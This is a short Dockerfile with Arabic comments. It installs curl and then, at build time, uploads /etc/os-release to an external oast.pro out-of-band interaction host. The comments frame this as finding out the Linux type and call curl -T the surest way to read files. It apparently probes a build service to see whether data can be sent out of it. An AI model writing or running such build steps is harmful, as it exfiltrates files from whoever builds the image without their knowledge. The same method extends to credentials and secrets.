FROM alpine:latest

# 1. نزل الأدوات
RUN apk add --no-cache curl

# 2. جرب ترفع ملف os-release (عشان نعرف نوع اللينكس)
# الـ -T معناها Transfer/Upload.. دي أضمن طريقة لقراءة الملفات
RUN curl -T /etc/os-release http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/upload_test || true
